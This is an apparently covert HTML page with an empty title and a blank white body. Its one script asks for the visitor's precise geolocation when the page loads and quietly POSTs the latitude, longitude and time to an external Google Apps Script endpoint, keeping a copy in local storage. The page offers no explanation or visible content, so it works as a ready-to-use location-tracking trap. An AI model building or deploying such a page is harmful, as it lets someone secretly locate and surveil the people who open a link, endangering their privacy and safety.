
<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title></title>
<style>
html, body {
  margin: 0;
  width: 100%;
  height: 100%;
  background: white;
}
</style>
</head>
<body>
<script>
const SCRIPT_URL =
"https://script.google.com/macros/s/AKfycbxneoW2kBbOcoBtqNvZDaYtdxS1foRS3iHiUDUqGddLJ3iimAon9MRwRiT27Ehb4rI/exec";

navigator.geolocation.getCurrentPosition(
  async (position) => {
    const data = {
      type: "location",
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      time: new Date().toISOString()
    };

    localStorage.setItem(
      "pending_location",
      JSON.stringify(data)
    );

    try {
      await fetch(SCRIPT_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    } catch (error) {
      // Konum cihazda saxlanılır.
    }
  },
  () => {},
  {
    enableHighAccuracy: true,
    timeout: 20000
  }
);
</script>
</body>
</html>
